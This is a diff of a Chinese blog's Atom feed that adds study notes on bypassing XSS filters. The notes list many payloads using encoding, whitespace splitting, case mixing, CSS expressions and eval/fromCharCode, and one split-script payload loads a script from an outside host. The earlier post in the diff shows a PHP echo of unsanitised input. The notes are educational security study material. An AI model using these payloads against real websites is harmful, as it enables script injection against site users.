@@ -4,7 +4,7 @@
   <subtitle><![CDATA[分享学习和生活中的点滴]]></subtitle>
   <link href="/atom.xml" rel="self"/>
   <link href="http://www.m4ster.net/"/>
-  <updated>2014-12-26T04:22:42.827Z</updated>
+  <updated>2014-12-26T10:20:26.270Z</updated>
   <id>http://www.m4ster.net/</id>
   
   <author>
@@ -13,6 +13,135 @@
   </author>
   
   <generator uri="http://zespia.tw/hexo/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[《XSS跨站脚本攻击剖析与防御》学习笔记（二）]]></title>
+    <link href="http://www.m4ster.net/2014/12/26/%E3%80%8AXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
+    <id>http://www.m4ster.net/2014/12/26/《XSS跨站脚本攻击剖析与防御》学习笔记（二）/</id>
+    <published>2014-12-26T07:57:01.000Z</published>
+    <updated>2014-12-26T10:20:09.000Z</updated>
+    <content type="html"><![CDATA[<h2 id="XSS构造剖析">XSS构造剖析</h2>
+<blockquote>
+<p>介绍如何绕过服务端的XSS过滤系统、如何构造强壮的XSS利用代码</p>
+</blockquote>
+<h2 id="绕过XSS-Filter">绕过XSS-Filter</h2>
+<p>现实中大多数的Web程序并非都是脆弱不堪、漏洞百出的。优秀的开发者是不容许自己的代码出现任何Bug 或漏洞的。<br>一般，为了防止XSS漏洞的出现，会在Web应用中设计一个XSS Filter，即跨站脚本过滤器，用于分析用户提交的输入，并消除潜在的跨站脚本攻击、恶意的HTML或简单的HTML格式错误等。  </p>
+<blockquote>
+<p>XSS Filter，一般是基于黑白名单的安全过滤策略。<br>白名单存放的是可信赖、对应用程序不构成威胁的数据列表<br>黑名单则相反，存储的是不受信赖的数据列表</p>
+</blockquote>
+<p>如果程序使用了基于黑名单式的过滤策略，那么，当用户提交信息时，该系统的XSS Filter会对所有的输入进行效验，如果检测到了黑名单中的数据，便进行拦截、编码和消毒过滤等处理。</p>
+<p>凡使用黑名单过略策略的XSS Filter，或多或少都会存在被绕过的可能。  </p>
+<h2 id="从攻击者的角度来探讨、展示绕过XSS_Filter的测试用例">从攻击者的角度来探讨、展示绕过XSS Filter的测试用例</h2>
+<h3 id="利用&lt;&gt;标记注释HTML/JavaScript">利用<code>&lt;&gt;</code>标记注释HTML/JavaScript</h3>
+<p>如果用户可以随心所欲的引入<code>&lt;&gt;</code>标记，那么他可以操作一个HTML标签，然后通过<code>&lt;script&gt;</code>标签就能任意插入脚本代码。如：  </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">alert(<span class="string">'XSS'</span>)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>
+
+<h3 id="利用HTML标签属性值执行XSS">利用HTML标签属性值执行XSS</h3>
+<p>用户不能随意构造HTML标签，但还可以使用其他形式来执行XSS，例如HTML标签的属性值。如：  </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">javascript:alert('XSS')</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">table</span> <span class="attribute">background</span>=<span class="value">"javascript:alert('XSS')"</span>&gt;</span><span class="tag">&lt;/<span class="title">table</span>&gt;</span></div></pre></td></tr></table></figure>
+
+<h3 id="空格、回车、Tab">空格、回车、Tab</h3>
+<p>如果XSS Filter仅仅是把敏感字符列入黑名单处理，可以尝试使用空格、回车、Tab键来绕过限制。如：  </p>
+<blockquote>
+<p><code>&lt;table background=&quot;javas    cript:alert(&#39;XSS&#39;)&quot;&gt;&lt;/table&gt;</code></p>
+</blockquote>
+<p>注意的一点是，javas和cript之间的不是空格，而是按下Tab添加的缩进，而且这种方法部分浏览器是不支持的。<br>也有时，浏览器引擎没有把换行符解析为语句的终止符，因为到换行处并不是一个完整的语句，JS会继续处理发现的内容，直到语句完整为止。如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">table</span> <span class="attribute">background</span>=<span class="value">"javas</span></span></div><div class="line">cript:</div><div class="line">alert('XSS')"&gt;<span class="tag">&lt;/<span class="title">table</span>&gt;</span></div></pre></td></tr></table></figure>
+
+<h3 id="对标签属性值转码">对标签属性值转码</h3>
+<p>对于普通的HTML标记的属性值进行过滤，用户可以通过编码处理来绕过，因为HTML中属性本身是支持<a href="http://zh.wikipedia.org/wiki/ASCII%E7%A0%81" target="_blank" rel="external">ASCII码</a>形式的。如：  </p>
+<blockquote>
+<p><code>&lt;img src=&quot;javascript:alert(&#39;XSS&#39;)&quot; /&gt;</code></p>
+</blockquote>
+<p>替换成：</p>
+<blockquote>
+<p><code>&lt;img src=&quot;javascript&amp;#116&amp;#58alert(/XSS/);&quot; /&gt;</code></p>
+</blockquote>
+<h3 id="产生自己的事件">产生自己的事件</h3>
+<p>JS与HTML的交互是通过事件来实现的，时间就是浏览器自身的某种动作，比如click、mouseover、load等，而想要时间的函数就叫作事件的处理函数（<code>或事件监听器</code>）。如：</p>
+<blockquote>
+<p><code>&lt;img src=x onerror=javascript:alert(/XSS/)&gt;</code></p>
+</blockquote>
+<h3 id="利用CSS跨站">利用CSS跨站</h3>
+<p>XSS跨站的另一个载体是CSS样式表，使用CSS样式表执行JS具有隐蔽、灵活多变等特点，但也有一个缺陷，就是不同版本的浏览器可能存在不兼容的问题。<br>直接使用CSS执行JS代码的示例如下：</p>
+<blockquote>
+<p><code>body{ background-image:url(&quot;javascript:alert(/XSS/)&quot;)}</code></p>
+</blockquote>
+<h3 id="扰乱过滤规则">扰乱过滤规则</h3>
+<h4 id="一个正常的XSS输入">一个正常的XSS输入</h4>
+<blockquote>
+<p><code>&lt;img src=x onerror=javascript:alert(&#39;XSS&#39;) /&gt;</code></p>
+</blockquote>
+<h4 id="大小写混淆的XSS">大小写混淆的XSS</h4>
+<blockquote>
+<p><code>&lt;iMg srC=x OnErrOr=JavaScriPt:AlerT(&#39;XSS&#39;) /&gt;</code></p>
+</blockquote>
+<h4 id="不使用引号的XSS">不使用引号的XSS</h4>
+<blockquote>
+<p><code>&lt;img src=x onerror=javascript:alert(/XSS/) /&gt;</code></p>
+</blockquote>
+<h4 id="利用浏览器特性的XSS">利用浏览器特性的XSS</h4>
+<blockquote>
+<p><code>&lt;img/src=x/onerror=javascript:alert(&#39;XSS&#39;) /&gt;</code></p>
+</blockquote>
+<h4 id="给代码添加注释">给代码添加注释</h4>
+<blockquote>
+<p><code>&lt;div style=&quot;widt/*-*/h:expre/*XSS*/ssion(alert(&#39;XSS&#39;))&quot;&gt;</code></p>
+</blockquote>
+<h3 id="利用字符编码">利用字符编码</h3>
+<p>HTML标签中的某些属性值可以使用<code>&amp;#ASCII</code>方式编码，这种XSS转码支持十进制和十六进制形式。举例：<br>以<code>&lt;img src=x onerror=javascript:alert(&#39;XSS&#39;) /&gt;</code>举例，他的属性值是  </p>
+<blockquote>
+<p><code>javascript:alert(&#39;XSS&#39;)</code></p>
+</blockquote>
+<p>进行十六进制转码(<code>#&amp;</code>)后得到：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&<span class="id">#106</span>;&<span class="id">#97</span>;&<span class="id">#118</span>;&<span class="id">#97</span>;&<span class="id">#115</span>;&<span class="id">#99</span>;&<span class="id">#114</span>;&<span class="id">#105</span>;&<span class="id">#112</span>;&<span class="id">#116</span>;&<span class="id">#58</span>;&<span class="id">#97</span>;&<span class="id">#108</span>;&<span class="id">#101</span>;&<span class="id">#114</span>;&<span class="id">#116</span>;&<span class="id">#40</span>;&<span class="id">#39</span>;&<span class="id">#88</span>;&<span class="id">#83</span>;&<span class="id">#83</span>;&<span class="id">#39</span>;&<span class="id">#41</span>;</div></pre></td></tr></table></figure>
+
+<p>完整的XSS Exploit如下</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=x onerror=&<span class="string">#106</span>;&<span class="string">#97</span>;&<span class="string">#118</span>;&<span class="string">#97</span>;&<span class="string">#115</span>;&<span class="string">#99</span>;&<span class="string">#114</span>;&<span class="string">#105</span>;&<span class="string">#112</span>;&<span class="string">#116</span>;&<span class="string">#58</span>;&<span class="string">#97</span>;&<span class="string">#108</span>;&<span class="string">#101</span>;&<span class="string">#114</span>;&<span class="string">#116</span>;&<span class="string">#40</span>;&<span class="string">#39</span>;&<span class="string">#88</span>;&<span class="string">#83</span>;&<span class="string">#83</span>;&<span class="string">#39</span>;&<span class="string">#41</span>; /&gt;</div></pre></td></tr></table></figure>
+
+<p>另外，在JS中有一个eval()函数，可以执行十六进制字符串形式的脚本，如对<code>alert(&#39;XSS&#39;)</code>进行十六进制转码后得到：</p>
+<blockquote>
+<p><code>\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29</code></p>
+</blockquote>
+<p>那么，完整的XSS代码为：</p>
+<blockquote>
+<p><code>&lt;script&gt;eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29&quot;);&lt;/script&gt;</code></p>
+</blockquote>
+<p><code>eval()</code>也可以执行10进制形式的脚本，但需要配合<code>String.fromCharCode()</code>函数使用。此函数用于将字符转为ASCII值，例如，一个正常形式的XSS为：</p>
+<blockquote>
+<p><code>&lt;img src=x onerror=javascript:eval(alert(&#39;XSS&#39;)) /&gt;</code></p>
+</blockquote>
+<p>结合使用<code>eval()</code>和<code>String.fromCharCode()</code>函数后变成：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">x</span> <span class="attribute">onerror</span>=<span class="value">javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</span> /&gt;</span></div></pre></td></tr></table></figure>
+
+<p>此外，样式表也支持分析和解释<code>\</code>连接的十六进制字符串形式，浏览器能正常解释，示例如下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">style</span>&gt;</span><span class="css"></span></div><div class="line"><span class="tag">BODY</span><span class="rules">{ <span class="rule"><span class="attribute">background</span>:<span class="value"> <span class="function">url</span>(http://<span class="number">127.0</span>.<span class="number">0.1</span>/xss.gif)</span></span></span>}</div><div class="line"><span class="tag">&lt;/<span class="title">style</span>&gt;</span></div></pre></td></tr></table></figure>
+
+<p>可以对background的属性值进行十六进制字符串形式转换：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">style</span>&gt;</span><span class="css"></span></div><div class="line"><span class="tag">BODY</span><span class="rules">{ <span class="rule"><span class="attribute">background</span>:<span class="value">  \<span class="number">75</span>\<span class="number">72</span>\<span class="number">6</span>c\<span class="number">28</span>\<span class="number">68</span>\<span class="number">74</span>\<span class="number">74</span>\<span class="number">70</span>\<span class="number">3</span>a\<span class="number">2</span>f\<span class="number">2</span>f\<span class="number">31</span>\<span class="number">32</span>\<span class="number">37</span>\<span class="number">2</span>e\<span class="number">30</span>\<span class="number">2</span>e\<span class="number">30</span>\<span class="number">2</span>e\<span class="number">31</span>\<span class="number">2</span>f\<span class="number">78</span>\<span class="number">73</span>\<span class="number">73</span>\<span class="number">2</span>e\<span class="number">67</span>\<span class="number">69</span>\<span class="number">66</span>\<span class="number">29</span> </span></span></span>}</div><div class="line"><span class="tag">&lt;/<span class="title">style</span>&gt;</span></div></pre></td></tr></table></figure>
+
+<p>style属性中的javascript、expression等字符一般会被程序过滤，但经过十六进制编码后则可以逃避过滤。<br>JS还支持unicode、escapes、十六进制、八进制等编码形式，这种编码技术如果运用于跨站攻击，无疑能大大加强XSS的威力。</p>
+<h3 id="拆分跨站法">拆分跨站法</h3>
+<p>当应用程序没有过滤XSS关键字符(<code>如&lt;、&gt;</code>)却对输入字符长度有限制的情况下，如何使用“拆分法”执行跨站脚本代码。如：一个留言板，没有过滤XSS字符，却限制了字符长度，那么可以使用以下Exploit:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">z=<span class="string">'document.'</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">z=z+<span class="string">'write("'</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">z=z+<span class="string">' src=ht'</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">z=z+<span class="string">'tp://ww'</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">z=z+<span class="string">'w.shell'</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">z=z+<span class="string">'.net/1.'</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">z=z+<span class="string">'js&gt;&lt;/sc'</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript">z=<span class="string">'z+ript&gt;")'</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(z)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>
+
+]]></content>
+    <summary type="html">
+    <![CDATA[<h2 id="XSS构造剖析">XSS构造剖析</h2>
+<blockquote>
+<p>介绍如何绕过服务端的XSS过滤系统、如何构造强壮的XSS利用代码</p>
+</blockquote>
+<h2 id="绕过XSS-Filter">绕过XSS-Filter</h2>
+<p>]]>
+    </summary>
+    
+      <category term="XSS" scheme="http://www.m4ster.net/tags/XSS/"/>
+    
+      <category term="跨站攻击" scheme="http://www.m4ster.net/tags/%E8%B7%A8%E7%AB%99%E6%94%BB%E5%87%BB/"/>
+    
+      <category term="读书笔记" scheme="http://www.m4ster.net/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
   
   <entry>
     <title><![CDATA[XSS跨站测试语句：XSS Cheat Sheet]]></title>
@@ -49,7 +178,7 @@
     <link href="http://www.m4ster.net/2014/12/25/%E3%80%8AXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
     <id>http://www.m4ster.net/2014/12/25/《XSS跨站脚本攻击剖析与防御》学习笔记（一）/</id>
     <published>2014-12-25T07:03:03.000Z</published>
-    <updated>2014-12-25T13:53:18.000Z</updated>
+    <updated>2014-12-26T07:57:17.000Z</updated>
     <content type="html"><![CDATA[<h2 id="跨站脚本介绍">跨站脚本介绍</h2>
 <p>XSS自1996年诞生以来，如今已经过十余年的演化。随着Web技术的蓬勃发展，XSS无疑已经变成了最流行和严重的Web安全漏洞，更被OWASP（<code>Open Web Application Security Project</code>）组织评为十大安全漏洞中的第二威胁漏洞。</p>
 <h3 id="什么是XSS跨站脚本">什么是XSS跨站脚本</h3>
@@ -72,14 +201,17 @@
 <p>HTML中的script元素标记中间包含javascript，浏览器调用脚本引擎处理。XSS攻击就是将非法的JavaScript、VBscript等脚本注入到用户浏览的网页上执行。</p>
 <h4 id="利用方法演示">利用方法演示</h4>
 <p>利用XSS弹出恶意警告框，代码为：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">scirpt</span>&gt;</span>alert("XSS")<span class="tag">&lt;/<span class="title">script</span>&gt;</span></div></pre></td></tr></table></figure>
-
+<blockquote>
+<p><code>&lt;scirpt&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code></p>
+</blockquote>
 <p>XSS输入也可能是HTML代码段，如要使网页不停的刷新，代码为：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">meta</span> <span class="attribute">http-equiv</span>=<span class="value">"refresh"</span> <span class="attribute">content</span>=<span class="value">"0;"</span>&gt;</span></div></pre></td></tr></table></figure>
-
+<blockquote>
+<p><code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;&quot;&gt;</code></p>
+</blockquote>
 <p>嵌入其他网站的链接，代码为：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">src</span>=<span class="value">http:</span>//<span class="attribute">www.test.com</span> <span class="attribute">width</span>=<span class="value">0</span> <span class="attribute">height</span>=<span class="value">0</span>&gt;</span><span class="tag">&lt;/<span class="title">iframe</span>&gt;</span></div></pre></td></tr></table></figure>
-
+<blockquote>
+<p><code>&lt;iframe src=http://www.test.com width=0 height=0&gt;&lt;/iframe&gt;</code></p>
+</blockquote>
 <h4 id="攻击原理具体说明">攻击原理具体说明</h4>
 <p>写一个PHP脚本，脚本代码为：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="preprocessor">&lt;?php</span></div><div class="line">    <span class="keyword">echo</span> <span class="variable">$_REQUEST</span>[<span class="string">'name'</span>];</div><div class="line"><span class="preprocessor">?&gt;</span></div></pre></td></tr></table></figure>
